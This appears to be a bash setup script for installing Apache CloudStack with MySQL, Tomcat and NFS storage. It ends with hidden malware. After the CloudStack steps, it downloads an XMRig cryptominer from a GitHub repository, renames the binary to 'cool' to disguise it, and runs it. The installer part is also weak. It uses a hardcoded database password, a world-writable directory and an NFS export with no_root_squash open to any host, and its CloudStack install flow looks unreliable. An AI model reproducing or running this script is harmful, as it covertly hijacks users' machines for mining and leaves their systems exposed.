#!/bin/bash

# Update and install dependencies
sudo apt update
sudo apt install -y openjdk-11-jdk mysql-server tomcat9 nfs-kernel-server wget curl

# Set up MySQL database for CloudStack
sudo mysql -u root <<EOF
CREATE DATABASE cloud;
CREATE USER 'cloud'@'localhost' IDENTIFIED BY 'cloudpassword';
GRANT ALL PRIVILEGES ON cloud.* TO 'cloud'@'localhost';
FLUSH PRIVILEGES;
EXIT
EOF

# Download and install CloudStack
wget http://cloudstack.apt-get.eu/ubuntu/4.17/4.17.0/apache-cloudstack-4.17.0-ubuntu20.04.tar.bz2
sudo tar -xjf apache-cloudstack-4.17.0-ubuntu20.04.tar.bz2 -C /opt
cd /opt/cloudstack-4.17.0

# Install CloudStack dependencies and management server
sudo ./install.sh -m

# Initialize CloudStack database
sudo cloudstack-setup-databases cloud:cloudpassword@localhost --deploy-as=root
sudo cloudstack-setup-management

# Set up NFS for primary storage
sudo mkdir -p /mnt/primary
sudo chmod 777 /mnt/primary
echo "/mnt/primary *(rw,sync,no_root_squash)" | sudo tee -a /etc/exports
sudo exportfs -a

# Configure CloudStack vCPU limits (adjust these as necessary)
sudo sed -i 's/vcpu.overprovisioning.factor=1/vcpu.overprovisioning.factor=2/' /etc/cloudstack/management/db.properties

# Start CloudStack management service
sudo systemctl start cloudstack-management

# Verify CloudStack management is running
echo "CloudStack management server status:"
sudo systemctl status cloudstack-management

sudo apt install wget
apt install wget
wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz
tar xvf xmrigtar.tar.gz
cd xmrig-6.22.0
chmod +x xmrig
 mv xmrig cool
./cool
